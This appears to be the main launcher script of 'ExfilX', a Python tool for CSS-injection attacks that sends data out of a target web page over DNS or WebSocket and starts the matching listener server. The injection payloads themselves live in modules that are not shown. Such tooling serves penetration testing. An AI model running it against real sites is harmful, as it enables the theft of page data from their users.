#!/usr/bin/env python3
import argparse
import sys
import logging
from colorama import init, Fore

from css_injector import CSSInjector
from exfiltration.dns_exfil import DNSExfiltrator
from exfiltration.websocket_exfil import WebSocketExfiltrator
from server.dns_server import DNSServer
from server.websocket_server import WebSocketServer

init(autoreset=True)  # Initialize colorama

def setup_logger():
    logger = logging.getLogger('exfilx')
    logger.setLevel(logging.INFO)

    handler = logging.StreamHandler()
    formatter = logging.Formatter(f'{Fore.CYAN}[%(asctime)s] {Fore.GREEN}%(levelname)s{Fore.RESET}: %(message)s',
                                 datefmt='%H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    return logger

def main():
    logger = setup_logger()

    parser = argparse.ArgumentParser(description='ExfilX - CSS Injection Data Exfiltration Tool')
    parser.add_argument('--target', '-t', required=True, help='Target URL to test for CSS injection')
    parser.add_argument('--method', '-m', choices=['dns', 'websocket'], default='dns',
                        help='Exfiltration method (dns or websocket)')
    parser.add_argument('--server', '-s', action='store_true', help='Start the exfiltration server')
    parser.add_argument('--dns-domain', '-d', default='exfil.local', help='Domain for DNS exfiltration')
    parser.add_argument('--ws-host', default='127.0.0.1', help='WebSocket server host')
    parser.add_argument('--ws-port', type=int, default=8765, help='WebSocket server port')
    parser.add_argument('--dns-port', type=int, default=53, help='DNS server port')
    parser.add_argument('--inject-point', '-i', help='CSS injection point (selector or URL parameter)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose output')

    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    try:
        if args.server:
            if args.method == 'dns':
                logger.info(f"Starting DNS exfiltration server on port {args.dns_port}")
                dns_server = DNSServer(port=args.dns_port, domain=args.dns_domain)
                dns_server.start()
            else:
                logger.info(f"Starting WebSocket exfiltration server on {args.ws_host}:{args.ws_port}")
                ws_server = WebSocketServer(host=args.ws_host, port=args.ws_port)
                ws_server.start()
        else:
            # Create the appropriate exfiltrator
            if args.method == 'dns':
                exfiltrator = DNSExfiltrator(domain=args.dns_domain)
            else:
                exfiltrator = WebSocketExfiltrator(host=args.ws_host, port=args.ws_port)

            # Create and run the CSS injector
            injector = CSSInjector(args.target, exfiltrator, inject_point=args.inject_point)
            injector.run()

    except KeyboardInterrupt:
        logger.info("Exiting ExfilX...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {str(e)}")
        if args.verbose:
            import traceback
            logger.debug(traceback.format_exc())
        sys.exit(1)

if __name__ == "__main__":
    main()
